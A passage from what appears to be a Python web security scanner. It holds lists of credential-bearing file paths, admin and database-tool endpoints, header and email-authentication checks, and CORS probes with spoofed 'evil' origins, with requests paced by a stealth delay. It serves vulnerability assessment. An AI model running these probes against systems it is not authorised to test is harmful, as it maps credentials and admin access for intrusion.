    ("/settings.json",         "MEDIUM",   "settings.json exposed — may reveal application configuration"),
    ("/database.yml",          "HIGH",     "database.yml exposed — Rails database config may contain credentials"),
    ("/wp-config.php.bak",     "CRITICAL", "WordPress config backup — likely contains DB credentials"),
    ("/config.php.bak",        "CRITICAL", "PHP config backup — likely contains credentials"),
    # PHP info / debug
    ("/phpinfo.php",           "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/info.php",              "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/test.php",              "MEDIUM",   "test.php accessible — debug/test script left in production"),
    # macOS / editor artifacts — leak directory structure
    ("/.DS_Store",             "MEDIUM",   ".DS_Store exposed — reveals directory file listing from macOS"),
    ("/.idea/workspace.xml",   "MEDIUM",   "JetBrains IDE workspace exposed — reveals project structure and file paths"),
    ("/.vscode/settings.json", "MEDIUM",   "VS Code settings exposed — may reveal project paths and extensions"),
    # CI/CD and secrets
    ("/.travis.yml",           "MEDIUM",   ".travis.yml exposed — reveals CI pipeline and may contain env var names"),
    ("/.circleci/config.yml",  "MEDIUM",   "CircleCI config exposed — reveals CI pipeline structure"),
    ("/.github/workflows",     "MEDIUM",   "GitHub Actions workflows exposed — reveals CI/CD pipeline"),
    ("/Jenkinsfile",            "MEDIUM",   "Jenkinsfile exposed — reveals CI/CD pipeline and may contain credentials"),
    # Logs
    ("/logs/error.log",        "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/error.log",             "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/access.log",            "MEDIUM",   "Access log exposed — reveals traffic patterns and internal endpoints"),
    ("/debug.log",             "HIGH",     "Debug log exposed — may contain sensitive application internals"),
    ("/storage/logs/laravel.log", "HIGH",  "Laravel log exposed — may contain stack traces and request data"),
]

# Body signatures confirming a real file was served (not a catch-all 200 error page)
SENSITIVE_FILE_SIGNATURES = {
    "/package.json":          ['"name"', '"version"', '"dependencies"'],
    "/package-lock.json":     ['"lockfileVersion"', '"node_modules"'],
    "/composer.json":         ['"require"', '"autoload"'],
    "/composer.lock":         ['"packages"', '"content-hash"'],
    "/Dockerfile":            ["FROM ", "RUN ", "COPY ", "EXPOSE "],
    "/docker-compose.yml":    ["services:", "version:", "image:"],
    "/docker-compose.yaml":   ["services:", "version:", "image:"],
    "/.npmrc":                ["registry=", "//registry", "_authToken"],
    "/.htpasswd":             [":$apr1$", ":$2y$", ":{SHA}"],
    "/phpinfo.php":           ["PHP Version", "phpinfo()", "php.ini"],
    "/info.php":              ["PHP Version", "phpinfo()", "php.ini"],
    "/test.php":              ["PHP Version", "phpinfo()", "php.ini", "<?php", "Test Page"],
    "/.DS_Store":             ["\x00\x00\x00\x01Bud1"],   # binary magic
    "/database.yml":          ["adapter:", "database:", "username:", "password:"],
    "/web.config":            ["<configuration>", "connectionStrings", "<system.web>"],
    "/Gemfile":               ["source ", "gem '"],
    "/Jenkinsfile":           ["pipeline {", "stages {", "agent "],
}

_sensitive_checked = set()

def check_sensitive_files(base_url, domain):
    """
    Probe for sensitive files that are commonly committed to source
    control or left accessible by misconfiguration.

    Uses a canary probe to suppress false positives from catch-all 200
    responses (same technique as backup file detection). Where body
    signatures are defined, confirms the file content before alerting.

    Probes run concurrently via a thread pool to avoid serialising on
    slow/hanging servers (e.g. hosts that read-timeout instead of 404ing).
    """
    if domain in _sensitive_checked:
        return
    _sensitive_checked.add(domain)

    # Canary probe — if a random path returns 200, skip (catch-all server)
    canary = base_url.rstrip("/") + f"/probe-canary-{random.randint(100000,999999)}.json"
    try:
        stealth_delay(domain)
        cr = _get_session().get(canary, headers=create_request_header(),
                          timeout=3, allow_redirects=False)
        if cr and cr.status_code == 200:
            print(timestamp() + f" Sensitive file check skipped (catch-all 200): {domain}")
            return
    except Exception:
        pass

    def _probe(path, severity, description):
        if _stop_event.is_set():
            return
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=3, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                return
            body = resp.text
            sigs = SENSITIVE_FILE_SIGNATURES.get(path)
            if sigs and not any(s in body for s in sigs):
                return
            alert("SENSITIVE FILE EXPOSED", severity, url, description)
            print(timestamp() + f" [!!] Sensitive file exposed [{severity}]: {url}")
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_sensitive_files probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in SENSITIVE_FILES]
        for f in as_completed(futures):
            pass  # errors are handled inside _probe


# ─────────────────────────────────────────────
# Admin panel / API doc / debug console discovery
# ─────────────────────────────────────────────

# (path, severity, description)
# 401/403 → "exists but protected" → reported at one severity step lower
ADMIN_PANEL_PATHS = [
    # Generic admin panels
    ("/admin",                   "HIGH",     "Admin panel returned 200 — may be accessible without authentication"),
    ("/administrator",           "HIGH",     "Administrator panel returned 200"),
    ("/admin/login",             "MEDIUM",   "Admin login page exposed"),
    ("/admin/dashboard",         "HIGH",     "Admin dashboard accessible"),
    ("/manage",                  "HIGH",     "Management panel accessible"),
    ("/management",              "HIGH",     "Management panel accessible"),
    ("/backend",                 "HIGH",     "Backend panel accessible"),
    ("/panel",                   "MEDIUM",   "Panel endpoint accessible"),
    ("/dashboard",               "MEDIUM",   "Dashboard endpoint accessible"),
    ("/cpanel",                  "HIGH",     "cPanel accessible"),
    ("/whm",                     "CRITICAL", "WHM (Web Host Manager) accessible"),
    # CMS-specific
    ("/wp-admin",                "HIGH",     "WordPress admin panel"),
    ("/wp-login.php",            "MEDIUM",   "WordPress login page exposed"),
    ("/xmlrpc.php",              "MEDIUM",   "WordPress XML-RPC enabled — brute force and DDoS amplification risk"),
    ("/typo3",                   "HIGH",     "TYPO3 CMS admin accessible"),
    ("/administrator/index.php", "HIGH",     "Joomla administrator login"),
    ("/concrete/index.php",      "HIGH",     "Concrete5 CMS admin"),
    # Database tools
    ("/phpmyadmin",              "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/phpmyadmin/",             "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/pma",                     "CRITICAL", "phpMyAdmin (pma) exposed"),
    ("/myadmin",                 "CRITICAL", "phpMyAdmin exposed"),
    ("/adminer",                 "CRITICAL", "Adminer database tool exposed"),
    ("/adminer.php",             "CRITICAL", "Adminer database tool exposed"),
    # Server status / monitoring
    ("/server-status",           "HIGH",     "Apache server-status exposed — active connections, request details, client IPs"),
    ("/server-info",             "HIGH",     "Apache server-info exposed — full server configuration"),
    ("/nginx_status",            "MEDIUM",   "nginx stub_status exposed"),
    # API documentation
    ("/swagger",                 "MEDIUM",   "Swagger UI exposed — API schema enumerable"),
    ("/swagger-ui",              "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui.html",         "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui/",             "MEDIUM",   "Swagger UI exposed"),
    ("/swagger/index.html",      "MEDIUM",   "Swagger UI exposed"),
    ("/api/swagger",             "MEDIUM",   "API Swagger UI exposed"),
    ("/api/swagger-ui",          "MEDIUM",   "API Swagger UI exposed"),
    ("/api-docs",                "MEDIUM",   "API documentation exposed"),
    ("/api/api-docs",            "MEDIUM",   "API documentation exposed"),
    ("/openapi.json",            "MEDIUM",   "OpenAPI spec exposed — full API schema enumerable"),
    ("/openapi.yaml",            "MEDIUM",   "OpenAPI spec exposed"),
    ("/api/openapi.json",        "MEDIUM",   "OpenAPI spec exposed"),
    ("/v1/api-docs",             "MEDIUM",   "API v1 documentation exposed"),
    ("/v2/api-docs",             "MEDIUM",   "API v2 documentation exposed"),
    ("/v3/api-docs",             "MEDIUM",   "API v3 documentation exposed"),
    ("/redoc",                   "MEDIUM",   "ReDoc API documentation exposed"),
    ("/api/docs",                "MEDIUM",   "API documentation accessible"),
    # Debug consoles
    ("/console",                 "CRITICAL", "Interactive console/REPL endpoint accessible — possible RCE"),
    ("/_debugbar",               "HIGH",     "Laravel DebugBar exposed — reveals request internals, queries, and config"),
    ("/telescope",               "HIGH",     "Laravel Telescope exposed — full application introspection"),
    ("/horizon",                 "HIGH",     "Laravel Horizon exposed — queue management interface"),
    ("/_profiler",               "HIGH",     "Symfony Profiler exposed — reveals request internals and route list"),
    ("/rails/info/properties",   "HIGH",     "Rails info/properties exposed — reveals app config and routes"),
    ("/rails/info/routes",       "HIGH",     "Rails route list exposed"),
]

# Body signatures that confirm a real admin/tool page vs a catch-all 200.
# Keys are path substrings — first match wins.
ADMIN_PANEL_SIGNATURES = {
    "phpmyadmin":           ["phpMyAdmin", "pma_username", "phpmyadmin"],
    "pma":                  ["phpMyAdmin", "pma_username"],
    "myadmin":              ["phpMyAdmin", "pma_username"],
    "adminer":              ["Adminer", "adminer", "db_driver", "login-form"],
    "wp-admin":             ["WordPress", "wp-login", "wp-admin"],
    "wp-login.php":         ["WordPress", "user_login", "log", "pwd"],
    "xmlrpc.php":           ["XML-RPC server", "xmlrpc"],
    "server-status":        ["Server Version:", "requests currently being processed", "Apache Server Status"],
    "server-info":          ["Apache Server Information", "Module Name", "mod_"],
    "nginx_status":         ["Active connections:", "server accepts handled"],
    "swagger":              ["swagger", "Swagger UI", "SwaggerUIBundle", "api-docs"],
    "openapi.json":         ['"openapi"', '"swagger"', '"paths"'],
    "openapi.yaml":         ["openapi:", "swagger:", "paths:"],
    "redoc":                ["ReDoc", "redoc", "api-docs"],
    "_debugbar":            ["debugbar", "DebugBar", "phpdebugbar"],
    "telescope":            ["telescope", "Telescope", "laravel-telescope"],
    "horizon":              ["horizon", "Horizon", "laravel-horizon"],
    "_profiler":            ["Symfony Profiler", "sf-profiler", "wdt-content"],
    "console":              ["console", "REPL", "Interactive Console", "Werkzeug Debugger", "werkzeug"],
    "rails/info":           ["Rails", "Controller", "ruby"],
    "cpanel":               ["cPanel", "Web Hosting Control Panel"],
    "whm":                  ["WHM", "Web Host Manager"],
}

def _admin_body_sigs(path):
    """Return signature list for path, or None if no confirmation needed."""
    for key, sigs in ADMIN_PANEL_SIGNATURES.items():
        if key in path:
            return sigs
    return None

_admin_checked = set()

def check_admin_panels(base_url, domain):
    """
    Probe for exposed admin panels, database tools, API documentation,
    server status pages, and debug consoles.

    Strategy:
    - Canary probe first to detect catch-all 200 servers (skip if triggered).
    - 200 responses: confirm with body signatures where available, then alert.
    - 401/403 responses: resource confirmed to exist (auth wall) — alert MEDIUM/LOW.
    - All probes run concurrently via ThreadPoolExecutor.
    """
    if domain in _admin_checked:
        return
    _admin_checked.add(domain)

    # Canary — if a random nonexistent path returns 200 we can't trust 200s
    canary = base_url.rstrip("/") + f"/probe-canary-{random.randint(100000,999999)}.admin"
    catch_all_200 = False
    try:
        cr = _get_session().get(canary, headers=create_request_header(),
                          timeout=4, allow_redirects=False)
        if cr and cr.status_code == 200:
            catch_all_200 = True
            print(timestamp() + f" Admin panel check: catch-all 200 on {domain} — 200 responses will be skipped")
    except Exception:
        pass

    def _probe(path, severity, description):
        if _stop_event.is_set():
            return
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=4, allow_redirects=False)
            if not resp:
                return
            status = resp.status_code

            if status in (200, 206):
                if catch_all_200:
                    return  # Can't trust 200 on this server
                body = resp.text
                sigs = _admin_body_sigs(path)
                if sigs and not any(s.lower() in body.lower() for s in sigs):
                    return  # 200 but body doesn't match — likely catch-all or unrelated page
                alert(f"ADMIN PANEL EXPOSED", severity, url,
                      description + f" (HTTP {status})")
                print(timestamp() + f" [!!] Admin panel [{severity}]: {url}")

            elif status in (401, 403):
                # Resource exists behind auth — lower severity than open access
                sev_map = {"CRITICAL": "HIGH", "HIGH": "MEDIUM", "MEDIUM": "LOW", "LOW": "LOW"}
                reduced = sev_map.get(severity, "LOW")
                alert("ADMIN PANEL FOUND (AUTH REQUIRED)", reduced, url,
                      description.split(" —")[0] + f" — protected (HTTP {status}), verify auth bypass")
                print(timestamp() + f"  Admin panel (auth) [{reduced}]: {url} ({status})")

        except requests.exceptions.Timeout:
            pass  # server hung — expected for scanner probes, not an error
        except Exception as e:
            print_error(f"check_admin_panels probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in ADMIN_PANEL_PATHS]
        for f in as_completed(futures):
            pass


# ─────────────────────────────────────────────
# Security headers audit
# ─────────────────────────────────────────────

# (header_name_lowercase, severity, finding_name, detail)
_SEC_HEADERS_REQUIRED = [
    (
        "strict-transport-security",
        "MEDIUM",
        "MISSING HSTS",
        "Strict-Transport-Security absent — HTTPS not enforced, connection may be downgraded to HTTP",
    ),
    (
        "content-security-policy",
        "MEDIUM",
        "MISSING CSP",
        "Content-Security-Policy absent — no XSS mitigation policy in place",
    ),
    (
        "x-frame-options",
        "MEDIUM",
        "MISSING X-FRAME-OPTIONS",
        "X-Frame-Options absent (and no CSP frame-ancestors) — site may be embeddable; clickjacking risk",
    ),
    (
        "x-content-type-options",
        "LOW",
        "MISSING X-CONTENT-TYPE-OPTIONS",
        "X-Content-Type-Options: nosniff absent — browser may MIME-sniff responses and execute mistyped scripts",
    ),
    (
        "referrer-policy",
        "LOW",
        "MISSING REFERRER-POLICY",
        "Referrer-Policy absent — full URL including query string sent to third-party origins via Referer header",
    ),
    (
        "permissions-policy",
        "LOW",
        "MISSING PERMISSIONS-POLICY",
        "Permissions-Policy absent — browser capabilities (camera, mic, geolocation) not explicitly restricted",
    ),
]

# Headers that disclose server internals — flagged when present, not when absent
# (header_name_lowercase, version_pattern, severity, detail_template)
_SEC_HEADERS_REVEALING = [
    (
        "server",
        re.compile(r"(?:Apache|nginx|IIS|lighttpd|openresty|litespeed|gunicorn|tornado|jetty|tomcat|jboss|websphere|weblogic)/[\d.]+", re.I),
        "LOW",
        "Server header discloses version: {value}",
    ),
    (
        "x-powered-by",
        re.compile(r".+"),
        "LOW",
        "X-Powered-By header reveals technology stack: {value}",
    ),
    (
        "x-aspnet-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNet-Version reveals .NET runtime version: {value}",
    ),
    (
        "x-aspnetmvc-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNetMvc-Version reveals ASP.NET MVC version: {value}",
    ),
]

_sec_headers_checked = set()

def check_security_headers(base_url, domain):
    """
    Audit HTTP security headers on the base URL.

    Checks for:
    - Missing defensive headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
      Referrer-Policy, Permissions-Policy
    - Revealing headers that disclose server/framework versions: Server, X-Powered-By,
      X-AspNet-Version, X-AspNetMvc-Version

    HSTS is only flagged on HTTPS sites — it has no effect over plain HTTP.
    X-Frame-Options is only flagged if CSP does not include a frame-ancestors directive,
    since frame-ancestors supersedes X-Frame-Options per spec.
    """
    if domain in _sec_headers_checked:
        return
    _sec_headers_checked.add(domain)

    try:
        resp = safe_get(base_url, timeout=8)
        if not resp:
            return
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
        is_https = base_url.startswith("https://")

        for hdr_name, severity, finding, detail in _SEC_HEADERS_REQUIRED:
            # HSTS only meaningful over HTTPS
            if hdr_name == "strict-transport-security" and not is_https:
                continue

            # X-Frame-Options: skip if CSP already has frame-ancestors (it supersedes XFO)
            if hdr_name == "x-frame-options":
                csp = hdrs.get("content-security-policy", "")
                if "frame-ancestors" in csp.lower():
                    continue

            if hdr_name not in hdrs:
                alert(finding, severity, base_url, detail)
                print(timestamp() + f"  Security header [{severity}] missing on {domain}: {hdr_name}")

        # Check for revealing headers
        for hdr_name, pattern, severity, detail_tmpl in _SEC_HEADERS_REVEALING:
            value = hdrs.get(hdr_name, "")
            if value and pattern.search(value):
                detail = detail_tmpl.format(value=value)
                alert("INFORMATION DISCLOSURE — HEADER", severity, base_url, detail)
                print(timestamp() + f"  Revealing header [{severity}] on {domain}: {hdr_name}: {value}")

    except Exception as e:
        print_error(f"check_security_headers failed for {domain}: {e}")


def count_spf_lookups(domain, depth=0, visited=None):
    """
    Recursively count DNS-querying mechanisms in an SPF record.

    Mechanisms that consume a lookup (RFC 7208 §4.6.4):
      include:, a, mx, ptr, exists:, redirect=
    Mechanisms that do NOT count: ip4:, ip6:, all, exp=, v=spf1

    Caps recursion at depth 15 and tracks visited domains to prevent cycles.
    Returns the total integer count of DNS lookups required to evaluate the record.
    """
    if visited is None:
        visited = set()
    if depth > 15 or domain in visited:
        return 0
    visited.add(domain)

    try:
        txt_records = dns.resolver.resolve(domain, 'TXT')
        spf = None
        for r in txt_records:
            val = r.to_text().strip('"')
            if val.startswith('v=spf1'):
                spf = val
                break
        if not spf:
            return 0
    except Exception:
        return 0

    count = 0
    for term in spf.split():
        term_lc = term.lower().lstrip('+-?~')
        if term_lc.startswith('include:'):
            count += 1
            count += count_spf_lookups(term[term.index(':') + 1:], depth + 1, visited)
        elif term_lc.startswith('redirect='):
            count += 1
            count += count_spf_lookups(term[term.index('=') + 1:], depth + 1, visited)
        elif (term_lc in ('a', 'mx', 'ptr') or
              term_lc.startswith(('a:', 'mx:', 'ptr:', 'exists:'))):
            count += 1
    return count


_DKIM_SELECTORS = ["default", "google", "k1", "mail", "dkim", "selector1", "selector2"]

def check_dkim_selectors(root):
    """
    Probe common DKIM selector TXT records at <selector>._domainkey.<root>.
    Reports MEDIUM if no selectors are found — indicates DKIM is not configured,
    weakening email authentication alongside SPF/DMARC.
    """
    found = []
    for sel in _DKIM_SELECTORS:
        try:
            answers = dns.resolver.resolve(f"{sel}._domainkey.{root}", "TXT")
            for rr in answers:
                val = rr.to_text().strip('"')
                if "p=" in val or "v=DKIM1" in val:
                    found.append(sel)
                    break
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.exception.Timeout, dns.resolver.NoNameservers):
            pass
        except Exception:
            pass

    if found:
        print(timestamp() + f" DKIM selectors found for {root}: {', '.join(found)}")
    else:
        alert(
            "NO DKIM SELECTORS FOUND",
            "MEDIUM",
            root,
            f"No DKIM TXT records found at standard selectors "
            f"({', '.join(_DKIM_SELECTORS)}) for {root} — "
            f"emails cannot be DKIM-signed, weakening email authentication"
        )
        print(timestamp() + f" [!] No DKIM selectors found for {root}")


def check_spf_dmarc(domain):
    """
    Query DNS TXT records to check SPF, DMARC, and DKIM configuration.

    Reportable findings:
      - Missing SPF entirely     → anyone can spoof @domain email
      - SPF with +all            → explicitly allows any server to send
      - SPF with ?all            → neutral/permissive, no spoofing protection
      - SPF with ~all            → softfail, not a hard reject
      - SPF lookup count > 10   → permerror at receiving MTAs (RFC 7208)
      - Missing DMARC            → no policy enforcement even if SPF/DKIM fail
      - DMARC with p=none        → monitoring only, no rejection/quarantine
      - DMARC with p=quarantine  → partial enforcement, upgrade to reject
      - DMARC missing rua=       → no aggregate reports, org is blind to spoofing
      - DMARC missing ruf=       → no forensic reports on individual failures
      - DMARC pct < 100          → policy not applied to all mail
      - DMARC sp= weaker than p= → subdomain spoofing less restricted than parent
      - No DKIM selectors found  → DKIM not configured
    """
    root = extract_root_domain(domain)

    # Only check once per root domain
    if not hasattr(check_spf_dmarc, "_checked"):
        check_spf_dmarc._checked = set()
    if root in check_spf_dmarc._checked:
        return
    check_spf_dmarc._checked.add(root)

    # ── SPF ──────────────────────────────────────────────────
    try:
        txt_records = dns.resolver.resolve(root, 'TXT')
        spf_record = None
        for record in txt_records:
            val = record.to_text().strip('"')
            if val.startswith("v=spf1"):
                spf_record = val
                break

        if spf_record is None:
            alert(
                "MISSING SPF RECORD",
                "HIGH",
                root,
                f"No SPF TXT record found for {root} — anyone can spoof email from this domain"
            )
            print(timestamp() + " [!] No SPF record for " + root)
        elif "+all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: +all",
                "HIGH",
                root,
                f"SPF record uses +all — explicitly permits any server to send as {root}: {spf_record}"
            )
            print(timestamp() + " [!!] SPF +all on " + root)
        elif "?all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: ?all",
                "HIGH",
                root,
                f"SPF record uses ?all (neutral) — provides no spoofing protection, receiving MTAs treat unauthenticated mail as neither pass nor fail: {spf_record}"
            )
            print(timestamp() + " [!] SPF ?all on " + root)
        elif "~all" in spf_record:
            alert(
                "SPF SOFTFAIL: ~all",
                "LOW",
                root,
                f"SPF record uses ~all (softfail) — failing messages are accepted and tagged "
                f"rather than rejected; upgrade to -all for hard enforcement: {spf_record}"
            )
            print(timestamp() + " [!] SPF ~all (softfail) on " + root)
        else:
            print(timestamp() + " SPF OK for " + root + ": " + spf_record[:80])

        # Recursive lookup count — RFC 7208 §4.6.4 limits evaluation to 10 DNS queries.
        # Exceeding this causes a permerror at receiving MTAs, which most treat as fail.
        if spf_record is not None:
            try:
                lookup_count = count_spf_lookups(root)
                if lookup_count > 10:
                    alert(
                        "SPF LOOKUP LIMIT EXCEEDED",
                        "MEDIUM",
                        root,
                        f"SPF record for {root} requires {lookup_count} DNS lookups "
                        f"(RFC 7208 limit is 10) — receiving MTAs will return permerror, "
                        f"causing legitimate mail to fail authentication"
                    )
                    print(timestamp() + f" [!] SPF lookup limit exceeded on {root}: {lookup_count} lookups")
            except Exception as _e:
                print_error(f"count_spf_lookups failed for {root}: {_e}")

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING SPF RECORD",
            "HIGH",
            root,
            f"No TXT records found for {root} — SPF absent, email spoofing possible"
        )

    # ── DMARC ────────────────────────────────────────────────
    try:
        dmarc_domain = "_dmarc." + root
        dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
        dmarc_record = None
        for record in dmarc_records:
            val = record.to_text().strip('"')
            if val.startswith("v=DMARC1"):
                dmarc_record = val
                break

        if dmarc_record is None:
            alert(
                "MISSING DMARC RECORD",
                "HIGH",
                root,
                f"No DMARC record at _dmarc.{root} — no enforcement policy, SPF/DKIM failures are not acted on"
            )
            print(timestamp() + " [!] No DMARC record for " + root)
        else:
            # Parse the policy value
            policy = None
            for part in dmarc_record.split(";"):
                part = part.strip()
                if part.startswith("p="):
                    policy = part[2:].strip().lower()
                    break

            # Parse all tags into a dict for the extended checks below
            dmarc_tags = {}
            for part in dmarc_record.split(";"):
                part = part.strip()
                if "=" in part:
                    k, _, v = part.partition("=")
                    dmarc_tags[k.strip().lower()] = v.strip()

            has_rua = "rua" in dmarc_tags and dmarc_tags["rua"]

            if policy == "none":
                alert(
                    "DMARC POLICY: p=none (monitor only)",
                    "MEDIUM",
                    root,
                    f"DMARC exists but p=none — emails that fail SPF/DKIM are NOT rejected or quarantined: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC p=none on " + root)
            elif policy == "quarantine":
                alert(
                    "DMARC POLICY: p=quarantine (partial enforcement)",
                    "MEDIUM",
                    root,
                    f"DMARC p=quarantine — failing messages are quarantined rather than rejected; "
                    f"upgrade to p=reject for full enforcement: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC p=quarantine on " + root)
            elif policy == "reject":
                print(timestamp() + " DMARC OK for " + root + " (p=reject — full enforcement)")
            else:
                print(timestamp() + " DMARC OK for " + root + " (p=" + str(policy) + ")")

            # rua= check — missing means org receives no aggregate failure reports (LOW for any policy)
            if not has_rua and policy != "none":
                alert(
                    "DMARC NO AGGREGATE REPORTING: rua= missing",
                    "LOW",
                    root,
                    f"DMARC record has no rua= tag — no aggregate reports will be sent, "
                    f"organisation is blind to spoofing attempts against {root}: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC missing rua= on " + root)

            # ruf= check — missing means no per-message forensic reports
            has_ruf = "ruf" in dmarc_tags and dmarc_tags["ruf"]
            if not has_ruf:
                alert(
                    "DMARC NO FORENSIC REPORTING: ruf= missing",
                    "INFO",
                    root,
                    f"DMARC record has no ruf= tag — no per-message forensic reports will be sent "
                    f"on authentication failures: {dmarc_record}"
                )

            # pct= check — partial policy application
            if "pct" in dmarc_tags:
                try:
                    pct = int(dmarc_tags["pct"])
                    if pct < 100:
                        alert(
                            "DMARC PARTIAL POLICY: pct<100",
                            "LOW",
                            root,
                            f"DMARC pct={pct} — policy is only applied to {pct}% of failing messages; "
                            f"remaining {100 - pct}% are delivered without enforcement: {dmarc_record}"
                        )
                        print(timestamp() + f" [!] DMARC pct={pct} (partial) on {root}")
                except ValueError:
                    pass

            # sp= check — subdomain policy must not be weaker than parent
            if "sp" in dmarc_tags:
                sp_policy = dmarc_tags["sp"].strip().lower()
                _policy_rank = {"reject": 2, "quarantine": 1, "none": 0}
                parent_rank  = _policy_rank.get(policy or "none", 0)
                sub_rank     = _policy_rank.get(sp_policy, 0)
                if sub_rank < parent_rank:
                    alert(
                        "DMARC SUBDOMAIN POLICY WEAKER THAN PARENT",
                        "MEDIUM",
                        root,
                        f"DMARC sp={sp_policy} is weaker than the parent policy p={policy} — "
                        f"subdomain spoofing is less restricted than the main domain: {dmarc_record}"
                    )
                    print(timestamp() + f" [!] DMARC sp={sp_policy} weaker than p={policy} on {root}")

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING DMARC RECORD",
            "HIGH",
            root,
            f"No DMARC record found for _dmarc.{root} — no enforcement policy"
        )
        print(timestamp() + " [!] No DMARC record for " + root)

    # ── DKIM ─────────────────────────────────────────────────
    check_dkim_selectors(root)

def check_cors_misconfiguration(base_url, domain):
    """
    Test for CORS misconfigurations using four distinct Origin probes.

    Test 1 — Arbitrary origin reflection:
      Origin: https://evil-cors-probe.com
      Flags CRITICAL if reflected with credentials, HIGH if reflected alone.

    Test 2 — Null origin bypass:
      Origin: null
      Browsers send this from sandboxed iframes. Flags HIGH if ACAO=null
      and credentials are allowed.

    Test 3 — Pre-domain prefix match:
      Origin: https://evil<domain> (e.g. https://evilexample.com)
      Indicates the server matches by prefix instead of exact string.
      Flags HIGH if reflected with credentials.

    Test 4 — Subdomain wildcard trust:
      Origin: https://evil.<domain>
      Indicates the server trusts all subdomains. Flags HIGH if reflected
      with credentials — any compromised subdomain can steal cookies.

    Tests 2-4 only flag when Allow-Credentials: true is also present.
    All four probes run in a single call — deduplication is handled by
    the caller via _exposure_checked.
    """
    try:
        root = extract_root_domain(domain)

        # ── Test 1: Arbitrary origin ───────────────────────────────
        evil_origin = "https://evil-cors-probe.com"
        stealth_delay(domain)
        resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": evil_origin},
            timeout=8,
            allow_redirects=True,
        )
        if not resp:
            return

        acao  = resp.headers.get("Access-Control-Allow-Origin", "")
        acac  = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        acam  = resp.headers.get("Access-Control-Allow-Methods", "")

        reflects_origin    = acao == evil_origin
        wildcard           = acao == "*"
        allows_credentials = acac == "true"

        if reflects_origin and allows_credentials:
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION + CREDENTIALS",
                "CRITICAL",
                domain,
                f"Server reflects arbitrary Origin and sets Allow-Credentials: true — "
                f"cross-origin requests with cookies are permitted. ACAO: {acao}"
            )
            print(timestamp() + " [!!] Critical CORS misconfiguration on " + domain)
        elif reflects_origin:
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION",
                "HIGH",
                domain,
                f"Server reflects arbitrary Origin header. ACAO: {acao}, "
                f"Methods: {acam or 'not specified'}"
            )
            print(timestamp() + " [!] CORS reflects origin on " + domain)
        elif wildcard and allows_credentials:
            alert(
                "CORS MISCONFIGURATION: WILDCARD + CREDENTIALS",
                "HIGH",
                domain,
                f"Access-Control-Allow-Origin: * combined with Allow-Credentials: true — "
                f"non-standard but potentially exploitable"
            )
            print(timestamp() + " [!] CORS wildcard+credentials on " + domain)

        # ── Test 2: Null origin bypass ─────────────────────────────
        stealth_delay(domain)
        null_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": "null"},
            timeout=8,
            allow_redirects=True,
        )
        if null_resp:
            null_acao = null_resp.headers.get("Access-Control-Allow-Origin", "")
            null_acac = null_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if null_acao == "null" and null_acac == "true":
                alert(
                    "CORS BYPASS: NULL ORIGIN + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server trusts Origin: null with Allow-Credentials: true — browsers send "
                    f"null origin from sandboxed iframes, enabling cross-origin credential theft. "
                    f"ACAO: {null_acao}"
                )
                print(timestamp() + f" [!] CORS null origin bypass on {domain}")

        # ── Test 3: Pre-domain prefix match bypass ─────────────────
        pre_origin = f"https://evil{root}"
        stealth_delay(domain)
        pre_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": pre_origin},
            timeout=8,
            allow_redirects=True,
        )
        if pre_resp:
            pre_acao = pre_resp.headers.get("Access-Control-Allow-Origin", "")
            pre_acac = pre_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if pre_acao == pre_origin and pre_acac == "true":
                alert(
                    "CORS BYPASS: PRE-DOMAIN PREFIX MATCH + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server reflects pre-domain origin '{pre_acao}' with Allow-Credentials: true — "
                    f"indicates prefix rather than exact origin matching; an attacker controlling "
                    f"a domain prefixed with '{root}' can steal credentials"
                )
                print(timestamp() + f" [!] CORS pre-domain prefix bypass on {domain}: {pre_acao}")

        # ── Test 4: Subdomain wildcard trust bypass ────────────────
        sub_origin = f"https://evil.{root}"
        stealth_delay(domain)
        sub_resp = _get_session().get(
            base_url,
            headers={**create_request_header(), "Origin": sub_origin},
            timeout=8,
            allow_redirects=True,
